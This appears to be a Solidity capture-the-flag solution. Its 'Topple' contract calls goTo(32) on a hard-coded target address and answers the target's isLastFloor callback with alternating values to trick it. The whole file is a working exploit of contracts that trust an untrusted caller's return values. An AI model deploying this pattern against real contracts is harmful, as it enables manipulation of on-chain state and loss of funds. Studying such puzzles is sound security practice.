// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Grounded {
  function goTo(uint _floor) external;
}

contract Topple {
  address TARGET = 0xA994958b3e0296067b38c040ee35c96D965af9FC;
  uint8 count = 0;

  constructor() {
    count = 0;
  }

  function isLastFloor(uint floor) external returns (bool) {
    count += 1;
    return count % 2 == 0;
  }

  function pwn() public {
    Grounded(TARGET).goTo(32);
  }
}
